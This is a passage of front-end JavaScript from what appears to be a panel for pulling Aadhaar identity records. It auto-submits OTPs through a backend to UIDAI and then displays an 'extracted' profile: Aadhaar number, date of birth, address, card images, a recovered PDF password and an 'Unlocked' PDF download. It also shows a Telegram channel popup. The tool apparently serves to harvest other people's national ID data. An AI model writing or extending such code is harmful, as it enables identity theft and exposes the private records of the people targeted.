function stopAutoOtpReader() {
  if (_aadhaarAutoOtpTimer) clearInterval(_aadhaarAutoOtpTimer);
}

async function submitAutoAadhaarOtp(otp) {
  if (!_aadhaarSessionId) return;

  try {
    // Check state first
    var stRes = await fetch(AADHAAR_API_BASE + '/aadhaar/status/' + _aadhaarSessionId);
    var stData = await stRes.json();

    var endpoint = stData.state === 'await_dl_otp' ? '/aadhaar/submit_dl_otp' : '/aadhaar/submit_otp';

    appendAadhaarLog('info', '[AUTO-SUBMIT] Submitting OTP ' + otp + ' to UIDAI…');

    var res = await fetch(AADHAAR_API_BASE + endpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ session_id: _aadhaarSessionId, otp: otp })
    });
    var data = await res.json();

    if (data.ok) {
      appendAadhaarLog('ok', '[SUCCESS] OTP Verified Successfully!');
    } else {
      appendAadhaarLog('error', '[OTP ERROR] ' + (data.detail || data.error || 'OTP submission failed'));
    }
  } catch(e) {
    appendAadhaarLog('error', '[SUBMIT ERROR] ' + e.message);
  }
}

function submitManualAadhaarOtp() {
  var input = document.getElementById('input-manual-otp');
  var otp = input ? input.value.trim() : '';
  if (!otp || otp.length !== 6) {
    showToast('Enter valid 6-digit OTP');
    return;
  }
  submitAutoAadhaarOtp(otp);
}

function renderAadhaarResult(res) {
  var card = document.getElementById('aadhaar-result-card');
  if (!card || !res) return;

  card.style.display = '';

  document.getElementById('aadhaar-res-name').textContent    = res.name || 'Extracted Profile';
  document.getElementById('aadhaar-res-no').textContent      = res.aadhaar_no || 'Extracted Aadhaar';
  document.getElementById('aadhaar-res-dob').textContent     = res.dob || 'As per Aadhaar';
  document.getElementById('aadhaar-res-gender').textContent  = res.gender || 'Verified';
  document.getElementById('aadhaar-res-address').textContent = res.address || 'UIDAI Official Record';

  var pwdEl = document.getElementById('aadhaar-res-password');
  if (pwdEl) {
    pwdEl.textContent = res.password ? '🔓 Password: ' + res.password : '🔓 Password: N/A';
  }

  var imgsContainer = document.getElementById('aadhaar-res-images');
  if (imgsContainer) {
    imgsContainer.innerHTML = '';
    if (res.front_b64 || res.back_b64) {
      var html = '<div style="display:flex;gap:12px;margin-top:12px;flex-wrap:wrap;">';
      if (res.front_b64) {
        html += '<div style="flex:1;min-width:180px;"><p style="font-size:0.7rem;color:#94a3b8;margin-bottom:4px;font-weight:600;">FRONT CARD</p><img src="data:image/jpeg;base64,' + res.front_b64 + '" style="width:100%;border-radius:8px;border:1px solid rgba(255,255,255,0.1);"/></div>';
      }
      if (res.back_b64) {
        html += '<div style="flex:1;min-width:180px;"><p style="font-size:0.7rem;color:#94a3b8;margin-bottom:4px;font-weight:600;">BACK CARD</p><img src="data:image/jpeg;base64,' + res.back_b64 + '" style="width:100%;border-radius:8px;border:1px solid rgba(255,255,255,0.1);"/></div>';
      }
      html += '</div>';
      imgsContainer.innerHTML = html;
    }
  }

  var dlBtn = document.getElementById('btn-download-aadhaar-pdf');
  if (dlBtn && res.pdf_b64) {
    dlBtn.href = 'data:application/pdf;base64,' + res.pdf_b64;
    dlBtn.download = 'Unlocked_' + (res.name ? res.name.replace(/\s+/g, '_') : 'Aadhaar') + '.pdf';
    dlBtn.style.display = '';
  } else if (dlBtn) {
    dlBtn.style.display = 'none';
  }
}


// ────────────────────────────────────────────────────────────────────────────
// Join Telegram Channel Modal (1-time check via localStorage)
// ────────────────────────────────────────────────────────────────────────────
function checkTgPopup() {
  try {
    var shown = localStorage.getItem('luffy_tg_popup_v1');
    if (!shown) {
      setTimeout(function() {
        var overlay = document.getElementById('tg-popup-overlay');
        if (overlay) overlay.style.display = 'flex';
      }, 600);
    }
  } catch(e) {}
}

function closeTgPopup() {
  try {
    localStorage.setItem('luffy_tg_popup_v1', 'true');
  } catch(e) {}
  var overlay = document.getElementById('tg-popup-overlay');
  if (overlay) overlay.style.display = 'none';
}

function tgPopupOverlayClick(e) {
  if (e.target && e.target.id === 'tg-popup-overlay') {
    closeTgPopup();
  }
}

function onJoinTgClick() {
  closeTgPopup();
}

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', checkTgPopup);
} else {
  checkTgPopup();
}
